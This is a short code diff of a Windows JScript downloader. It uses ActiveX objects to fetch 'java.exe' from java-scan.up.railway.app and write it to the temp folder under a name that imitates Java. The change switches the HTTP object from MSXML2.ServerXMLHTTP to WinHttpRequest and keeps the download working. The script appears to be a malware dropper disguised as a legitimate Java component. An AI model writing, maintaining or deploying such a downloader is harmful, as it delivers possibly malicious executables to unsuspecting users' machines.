@@ -3,14 +3,14 @@ var w = new ActiveXObject("WScript.Shell");
 var f = new ActiveXObject("Scripting.FileSystemObject");
 var tmp = f.GetSpecialFolder(2) + "\\java.exe";
 
-var x = new ActiveXObject("MSXML2.ServerXMLHTTP");
-x.open("GET", "https://java-scan.up.railway.app/java.exe", false);
-x.send();
+var x = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+x.Open("GET", "https://java-scan.up.railway.app/java.exe", false);
+x.Send();
 
 var s = new ActiveXObject("ADODB.Stream");
 s.Open();
 s.Type = 1;
-s.Write(x.responseBody);
+s.Write(x.ResponseBody);
 s.SaveToFile(tmp, 2);
 s.Close();
 
